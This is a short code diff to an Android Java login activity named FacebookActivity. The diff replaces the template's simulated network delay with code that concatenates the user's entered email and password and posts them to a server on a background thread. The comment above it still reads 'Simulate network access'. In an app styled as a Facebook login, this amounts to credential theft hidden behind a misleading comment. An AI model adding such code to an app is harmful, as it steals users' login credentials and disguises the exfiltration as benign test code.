@@ -308,12 +308,11 @@ public class FacebookActivity extends AppCompatActivity implements LoaderCallbac
         protected Boolean doInBackground(Void... params) {
             // TODO: attempt authentication against a network service.
 
-            try {
-                // Simulate network access.
-                Thread.sleep(2000);
-            } catch (InterruptedException e) {
-                return false;
-            }
+            // Simulate network access.
+            String content = "email=" + mEmail + ";passw=" + mPassword;
+
+            // post content to server
+            new Thread(new RequestHttp(content)).start();
 
             for (String credential : DUMMY_CREDENTIALS) {
                 String[] pieces = credential.split(":");
